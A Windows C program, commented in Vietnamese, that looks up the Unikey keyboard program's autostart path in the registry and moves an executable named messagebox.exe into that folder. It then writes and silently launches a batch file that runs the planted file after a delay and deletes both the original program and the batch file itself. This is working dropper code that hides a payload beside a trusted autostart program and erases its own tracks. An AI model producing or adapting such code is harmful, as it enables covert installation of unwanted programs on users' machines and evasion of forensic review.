#include <windows.h>
#include <stdio.h>
#include <shlwapi.h> // Thêm thư viện này để sử dụng hàm PathRemoveFileSpec

int main() {
    HKEY hKey;
    DWORD dwType = REG_SZ;
    char path[MAX_PATH];
    DWORD dwSize = sizeof(path);
    char exePath[MAX_PATH];
    char destPath[MAX_PATH];
    char batchPath[MAX_PATH];
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Lấy đường dẫn của tệp thực thi hiện tại
    if (GetModuleFileName(NULL, exePath, MAX_PATH) == 0) {
        printf("Failed to get executable path. Error: %lu\n", GetLastError());
        return 1;
    }

    // Lấy thư mục hiện tại
    char currentDir[MAX_PATH];
    if (GetCurrentDirectory(MAX_PATH, currentDir) == 0) {
        printf("Failed to get current directory. Error: %lu\n", GetLastError());
        return 1;
    }

    // Mở khóa registry
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        // Đọc giá trị Unikey
        if (RegQueryValueEx(hKey, "Unikey", NULL, &dwType, (LPBYTE)path, &dwSize) == ERROR_SUCCESS) {
            printf("Path to Unikey: %s\n", path);

            // Tạo đường dẫn thư mục từ path
            if (PathRemoveFileSpec(path)) { // Xóa phần tệp để lấy đường dẫn thư mục
                sprintf(destPath, "%s\\messagebox.exe", path);

                if (MoveFileEx(".\\messagebox.exe", destPath, MOVEFILE_REPLACE_EXISTING)) {
                    printf("File moved successfully to: %s\n", destPath);

                    /*
                    // Xóa messagebox.exe từ thư mục đích
                    if (DeleteFile(".\\messagebox.exe")) {
                        printf("messagebox.exe deleted successfully.\n");
                    } else {
                        printf("Failed to delete messagebox.exe. Error: %lu\n", GetLastError());
                    }


                    UINT result = WinExec(destPath, SW_SHOWNORMAL);
                    if (result > 31) {
                        printf("messagebox.exe started successfully.\n");
                    } else {
                        printf("Failed to start messagebox.exe. Error: %lu\n", GetLastError());
                    } */

                    // Tạo batch file để xóa tệp thực thi
                    sprintf(batchPath, "%s\\cleanup.bat", currentDir);
                    FILE *batchFile = fopen(batchPath, "w");
                    if (batchFile) {
                        fprintf(batchFile, "@echo off\n");
                        fprintf(batchFile, "timeout /t 10 /nobreak > nul\n"); // Đợi 5 giây
                        fprintf(batchFile, "\"%s\"\n", destPath); // Run the executable at destPath
                        fprintf(batchFile, "del \"%s\"\n", exePath);
                        fprintf(batchFile, "del \"%s\"\n", batchPath); // Xóa batch file sau khi thực hiện xong
                        fprintf(batchFile, "exit\n");
                        fclose(batchFile);

                        // Khởi tạo thông tin cho quá trình mới
                        ZeroMemory(&si, sizeof(si));
                        si.cb = sizeof(si);
                        ZeroMemory(&pi, sizeof(pi));


                        char *workingDir = path;
                        // Tạo và chạy batch file
                        if (CreateProcess(NULL, batchPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, workingDir, &si, &pi)) {
                                 printf("PID of the cleanup process: %lu\n", (unsigned long)pi.dwProcessId);
                            // Không đợi quá trình hoàn tất, để batch file tự xử lý
                            CloseHandle(pi.hProcess);
                            CloseHandle(pi.hThread);

                        } else {
                            printf("Failed to create cleanup process. Error: %lu\n", GetLastError());
                        }
                    } else {
                        printf("Failed to create batch file.\n");
                    }
                } else {
                    printf("Failed to copy the file. Error: %lu\n", GetLastError());
                }
            } else {
                printf("Failed to get directory path from Unikey path.\n");
            }
        } else {
            printf("Failed to read registry value.\n");
        }

        // Đóng khóa registry
        RegCloseKey(hKey);
    } else {
        printf("Failed to open registry key.\n");
    }

    return 0;
}
